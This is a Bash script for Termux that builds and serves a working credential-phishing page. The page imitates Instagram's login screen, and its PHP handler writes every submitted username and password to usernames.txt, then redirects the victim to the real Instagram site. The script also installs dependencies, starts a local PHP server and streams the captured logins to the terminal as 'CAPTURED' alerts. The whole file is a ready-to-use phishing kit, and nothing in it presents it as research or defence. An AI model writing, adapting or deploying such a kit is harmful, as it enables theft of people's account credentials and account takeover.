#!/bin/bash

# --- 1. AUTO INSTALLER (System Check) ---
echo -e "\033[1;33m[*] Setting up Custom Design...\033[0m"
packages=("php" "proot" "wget")
for pkg in "${packages[@]}"; do
    if ! command -v $pkg &> /dev/null; then
        echo -e "\033[1;31m[!] Installing $pkg...\033[0m"
        pkg install $pkg -y > /dev/null 2>&1
    fi
done

# --- 2. CLEANUP ---
pkill -f php > /dev/null 2>&1
rm -rf auth/
mkdir -p auth

# --- 3. INJECT YOUR CUSTOM HTML (With Capture Logic) ---
# Maine aapke HTML me <form> tag add kiya hai taki password capture ho sake
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; }
.card h2{ font-size:20px; margin-bottom:20px; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.input:focus{ border: 1px solid #fff; }
/* Button ko Active look diya hai taki click ho sake */
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.btn:hover{ background:#1877f2; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor:pointer; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor:pointer; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor:pointer; }
.meta{ text-align:center; margin-top:25px; opacity:.7; }
@media(max-width:900px){ .main{flex-direction:column;} .left,.right{width:100%;} .left{display:none;} .right{height:100vh;} }
</style>
</head>
<body>

<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br>your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>

    <div class="right">
        <div class="card">
            <h2>Log in to Instagram</h2>
            
            <form method="POST" action="login.php">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">∞ Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 4. CAPTURE LOGIC ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "IG User: " . \$_POST['username'] . " | Pass: " . \$_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 5. START SERVER (God Mode) ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
GOLD='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GREEN}==========================================${RESET}"
echo -e "${GOLD}    INSTAGRAM UI SERVER (Custom Design)   ${RESET}"
echo -e "${CYAN}    Status: GOD MODE (Permission Fixed)   ${RESET}"
echo -e "${GREEN}==========================================${RESET}"

echo -e "${CYAN}[*] Starting Server...${RESET}"

# Using termux-chroot for 100% success
termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
PID=$!
sleep 3

# --- 6. MONITORING ---
if ps -p $PID > /dev/null; then
    echo -e "${GREEN}[✔] PAGE HOSTED SUCCESSFULLY!${RESET}"
    echo -e "${CYAN}-----------------------------------${RESET}"
    echo -e "${GOLD}👉 Link: http://127.0.0.1:8080${RESET}"
    echo -e "${CYAN}-----------------------------------${RESET}"
    echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
    echo ""
    echo -e "${GREEN}Waiting for Login...${RESET}"
    
    touch usernames.txt
    tail -f usernames.txt | while read line; do
        echo -e "${RED}[!] CAPTURED: ${GOLD}$line${RESET}"
        echo -e "\a"
    done
else
    echo -e "${RED}[!] Server Error.${RESET}"
fi
